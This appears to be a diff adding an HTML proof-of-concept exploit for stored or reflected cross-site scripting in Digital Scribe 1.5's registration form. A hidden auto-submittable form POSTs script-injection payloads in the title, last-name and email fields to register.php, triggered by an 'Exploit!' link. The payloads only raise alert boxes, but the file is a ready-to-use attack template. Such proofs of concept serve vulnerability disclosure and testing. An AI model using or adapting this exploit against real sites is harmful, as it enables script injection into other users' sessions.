@@ -1,0 +1,17 @@
+<html>
+<title>Digital Scribe 1.5 (register_form()) Multiple POST XSS Vulnerabilities</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xss(){document.forms["xss"].submit();}
+</script>
+<br /><br />
+<form action="http://localhost/digitalscribe/digitalscribe/register.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="title" value='"><script>alert(1)</script>' />
+<input type="hidden" name="last" value='"><script>alert(2)</script>' />
+<input type="hidden" name="email" value='1"><script>alert(3)</script>' />
+<input type="hidden" name="action" value="4" />
+<input type="hidden" name="Submit" value="Register" />
+</form>
+<a href="javascript: xss();" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit!</h3></center></font></b></a><br /><br />
+</body></html>
